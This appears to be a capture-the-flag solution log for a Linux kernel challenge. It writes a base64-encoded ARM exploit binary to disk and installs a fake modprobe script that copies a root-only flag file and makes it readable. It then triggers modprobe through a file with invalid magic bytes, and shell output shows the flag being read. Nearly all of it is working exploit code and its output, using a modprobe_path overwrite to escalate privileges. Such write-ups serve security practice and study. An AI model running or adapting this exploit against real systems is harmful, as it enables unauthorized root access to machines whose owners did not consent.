cd /home/user

echo -n f0VMRgEBAQAAAAAAAAAAAAIAKAABAAAA2AABADQAAACQBAAAAAIABTQAIAAEACgACgAJAAEAAAAAAAAAAAABAAAAAQCoAQAAqAEAAAUAAAAAAAEAAQAAAKgBAACoAQIAqAECAAQAAAAEAAAABgAAAAAAAQAEAAAAtAAAALQAAQC0AAEAJAAAACQAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAQAAAABAAAABQAAAADAAAAR05VACnt+TfMWkgMVttSDl8Iti4KPYR+AEgt6QSwjeIw0E3iaDCf5TDAS+ID4KDhDwC+6A8ArOgAMJ7lADCM5RwwS+IDAKDhHAAA6xgwG+UwEEviFCCg4wMAoOEUAADrFDBL4gMgoOEkEKDjAADg4xUAAOscABvlGDCf5QAwk+UUIKDjAxCg4QYAAOsAAKDjAQAA65QBAQCoAQIAAXCg4wAAAO8e/y/hA3Cg4wAAAO8e/y/hBHCg4wAAAO8e/y/hKnCg4wAAAO8e/y/h3QCQ7x7/L+EvaG9tZS91c2VyL21vZHByb2JlAMhNM8FHQ0M6IChVYnVudHUvTGluYXJvIDcuMy4wLTI3dWJ1bnR1MX4xOC4wNCkgNy4zLjAAQSkAAABhZWFiaQABHwAAAAU1VAAGAwgBCQESBBQBFQEXAxgBGQEaAh4GAAAAAAAAAAAAAAAAAAAAAAAAAAAAtAABAAAAAAADAAEAAAAAANgAAQAAAAAAAwACAAAA > x.b64
echo -n AACUAQEAAAAAAAMAAwAAAAAAqAECAAAAAAADAAQAAAAAAAAAAAAAAAAAAwAFAAAAAAAAAAAAAAAAAAMABgABAAAAAAAAAAAAAAAEAPH/CwAAAKgBAgAAAAAAAAAEAAsAAACUAQEAAAAAAAAAAwAOAAAA2AABAAAAAAAAAAIAEQAAAIABAQAAAAAAAAACABYAAAB0AQEAAAAAAAAAAgAcAAAAjAEBAAAAAAAAAAIAKQAAAGgBAQAAAAAAAAACAC4AAABcAQEAAAAAAAAAAgALAAAAVAEBAAAAAAAAAAIADgAAAFwBAQAAAAAAAAACAEIAAACsAQIAAAAAABAABAAzAAAArAECAAAAAAAQAAQAQQAAAKwBAgAAAAAAEAAEAFIAAADYAAEAhAAAABIAAgBNAAAArAECAAAAAAAQAAQAWQAAAKwBAgAAAAAAEAAEAGEAAACsAQIAAAAAABAABABoAAAArAECAAAAAAAQAAQAbQAAAKgBAgAEAAAAEQAEAABleHBsb2l0LmMAJGQAJGEAcGlwZQB3cml0ZQBvYWJpX2ZjbnRsNjQAcmVhZABleGl0AF9fYnNzX3N0YXJ0X18AX19ic3NfZW5kX18AX19ic3Nfc3RhcnQAX19lbmRfXwBfZWRhdGEAX2VuZABtb2Rwcm9iZV9wYXRoAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAudGV4dAAucm9kYXRhAC5kYXRh >> x.b64
echo -n AC5jb21tZW50AC5BUk0uYXR0cmlidXRlcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABwAAAAIAAAC0AAEAtAAAACQAAAAAAAAAAAAAAAQAAAAAAAAALgAAAAEAAAAGAAAA2AABANgAAAC8AAAAAAAAAAAAAAAEAAAAAAAAADQAAAABAAAAAgAAAJQBAQCUAQAAFAAAAAAAAAAAAAAABAAAAAAAAAA8AAAAAQAAAAMAAACoAQIAqAEAAAQAAAAAAAAAAAAAAAQAAAAAAAAAQgAAAAEAAAAwAAAAAAAAAKwBAAAxAAAAAAAAAAAAAAABAAAAAQAAAEsAAAADAABwAAAAAAAAAADdAQAAKgAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAACAIAALABAAAIAAAAEgAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAALgDAAB7AAAAAAAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAzBAAAWwAAAAAAAAAAAAAAAQAAAAAAAAA= >> x.b64
base64 -d x.b64 > exploit

echo -ne '#!/bin/sh\ncp /flag/flag.txt /flag.txt\nchmod -R +r /flag.txt\n' > modprobe
echo -ne '\xff\xff\xff\xff' > hoge
chmod +x *

./exploit
./hoge

cat /flag.txt

/ $ ls -al
total 5
drwxr-xr-x   12 root     0                0 Jan 20 09:04 .
drwxr-xr-x   12 root     0                0 Jan 20 09:04 ..
drwxr-xr-x    2 root     0                0 Jan 18 13:36 bin
drwxr-xr-x    2 root     0                0 Jan 20 09:03 dev
drwxr-xr-x    3 root     0                0 Jan 18 14:11 etc
drw-------    3 root     0             1024 Jan 18 12:11 flag
-rw-r--r--    1 root     0               33 Jan 20 09:04 flag.txt
drwxr-xr-x    3 root     0                0 Jan 18 14:10 home
lrwxrwxrwx    1 root     0               11 Jan 18 13:36 linuxrc -> bin/busybox
dr-xr-xr-x   70 root     0                0 Jan  1  1970 proc
drwxr-xr-x    2 root     0                0 Jan 18 21:04 root
drwxr-xr-x    2 root     0                0 Jan 18 13:36 sbin
dr-xr-xr-x   12 root     0                0 Jan 20 09:03 sys
drwxr-xr-x    4 root     0                0 Jan 18 21:04 usr
/ $ cat flag.txt
INS{KERNEL_DS_make5_life_e4sier}
